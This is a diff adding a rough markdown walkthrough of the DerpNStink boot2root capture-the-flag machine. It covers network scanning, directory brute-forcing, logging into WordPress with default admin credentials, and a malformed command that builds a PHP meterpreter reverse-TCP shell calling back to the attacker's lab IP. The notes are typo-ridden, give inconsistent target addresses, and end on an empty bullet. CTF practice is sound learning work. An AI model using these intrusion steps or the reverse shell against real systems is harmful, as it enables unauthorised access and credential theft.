@@ -1,0 +1,28 @@
+# The DerpNStink CTF
+Welcome! Today Jack is going to walkthrough Derp N Stink CTF to break into another machine with a different objective. 
+## Walkthrough
+- First, we check out the description of the CTF, we found that he is dealing with a boot2root ubuntu based virtual machine, with DHCP setting 
+- Goal is remotely attack the VM and find  all 4 flags to destroy the machine
+- The he used terminal to find out ip adress through IP/If Config, found out that is own IP adress is 192.168.170.128
+- Then, he used command: nmap -sS 192.168.170.* (or 0/24) to get all the IP adress on this network that he is in to find the vurnerable machine
+- The -sS also gave him the port, it give him detail of 3 port ssh(22), ftp(21), http(80), all of them are open. 
+- There is also another IP adress 192.168.170.254 which probably the machine of target
+- Which he used the http port and type in the IP adress of 192.168.170.131, it gives him a website that include a image, background and a purple words
+- Then Jack check the sources code (element), he found the html code, in which he found flag1 when he expand it. 
+- Then he check for robot.txt of the IP adress, but there is nothing
+- Then he ran Dirbuster, on the http ip adress and find the wordlist to applied on the website. 
+- Which it create two new directorues and a word press directories of the same website, 
+- Jack found the wordpress of the DerpNStink CTF, which give detail of the page 
+- So, he open wordpress and log in to it. Username is admin (using the tool of wpscan, give vunerability and username list), or hydra (dictonary based) and metasploit, or burpsuite.
+- So, its admin for user and admin for pass and got into wordpress.
+- Inside wordpress there is a menu to create blog, and the ability to give permission on certain bit of the site to other user.
+- Jack now had access to all the slideshow, in which he is definitely not the admin. 
+- Jack is back to use wpscan, and he used the url scan of the website. 
+- He found data on the vunerability list, in which each vunerability to explain what it the vunerability is, how to break into the vunerability, and date of fixed. 
+- So, Jack file out detail on the vunerability on exploit database. 
+- And he download the script to break in the vunerability
+- Back on terminal, he used the command: msf -p php/meterpreter_reverse-tcp-LHOST = 192.168.170.128 LPORT = 4444 -f raw . shell.php, to reverse engineer the webite with shell.
+- After that, he is running the exploit and the python command to upload the shell to gain access to the machine.
+- After gaining access to the machine, check whoami, found two folder. One being stinky
+- Then he check all the website file through weblog ls, this give him acess to IP file, password and userfile. Password might be encoded so use hashid.
+- 
